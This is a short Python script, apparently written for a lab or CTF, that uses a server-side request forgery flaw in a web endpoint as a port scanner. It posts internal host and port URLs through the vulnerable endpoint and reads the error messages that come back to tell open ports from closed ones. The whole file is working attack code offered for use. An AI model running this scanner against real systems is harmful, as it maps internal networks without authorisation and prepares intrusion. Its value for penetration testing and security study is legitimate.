#!/usr/bin/env python3

"""
Usage:
python3 ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5 
"""


import argparse
import requests

# Define commonly scanned ports
COMMON_PORTS = [
    22, 80, 443, 1433, 1521, 3306, 3389, 5000, 5432,
    5900, 6379, 8000, 8001, 8055, 8080, 8443, 9000
]

# Argument parsing
parser = argparse.ArgumentParser(description="SSRF-based port scanner via a proxy endpoint.")
parser.add_argument('-t', '--target', help='Host/IP to target (the SSRF vulnerable endpoint)', required=True)
parser.add_argument('-s', '--ssrf', help='SSRF target (the internal host to probe)', required=True)
parser.add_argument('--timeout', help='Request timeout in seconds (default: 3)', type=int, default=3)
parser.add_argument('-v', '--verbose', help='Enable verbose mode', action='store_true')

args = parser.parse_args()

# Port scanning logic
for port in COMMON_PORTS:
    try:
        url = args.target
        payload = {"url": f"{args.ssrf}:{port}"}
        response = requests.post(url=url, json=payload, timeout=args.timeout)

        if args.verbose:
            print(f"{port}\tVERBOSE: {response.text.strip()}")

        text = response.text

        if "You don't have permission to access this." in text:
            print(f"{port}\tOPEN (permission error indicates resource exists)")
        elif "ECONNREFUSED" in text:
            print(f"{port}\tCLOSED")
        elif "timeout" in text.lower():
            print(f"{port}\tTIMED OUT (reported by server)")
        else:
            print(f"{port}\tUNKNOWN RESPONSE: {text.strip()[:80]}")  # limit output length

    except requests.exceptions.Timeout:
        print(f"{port}\tTIMED OUT (request exception)")
    except requests.exceptions.RequestException as e:
        print(f"{port}\tERROR: {e}")
